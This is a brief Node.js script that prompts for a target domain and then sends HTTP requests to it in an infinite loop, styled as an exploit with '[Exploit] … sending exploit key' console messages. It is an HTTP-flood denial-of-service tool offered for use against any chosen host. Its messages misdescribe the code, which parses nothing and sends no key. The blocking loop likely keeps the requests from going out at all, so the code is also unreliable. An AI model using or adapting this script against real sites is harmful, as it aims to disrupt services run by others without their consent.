let http = require('http');

const readline = require('readline').createInterface({
	input: process.stdin,
 	output: process.stdout
});
let i = 1;
let value = 0;
readline.question('[+] Enter target http request domain: ', domain => {
	let options = {
		host: domain,
		path: '/'
	};

	callback = function(response) {
		var str = '';

		response.on('data', function (chunk) {
			str += chunk;
		});

		response.on('end', function () {
			i = 2;
		});
	}

	while(true) {
		http.request(options, callback).end();
		console.log("[+] Http request sending to target http domain: " + value);
		console.log("    [Exploit] Parsing response and sending exploit key");
		value++;
	}
	readline.close();
});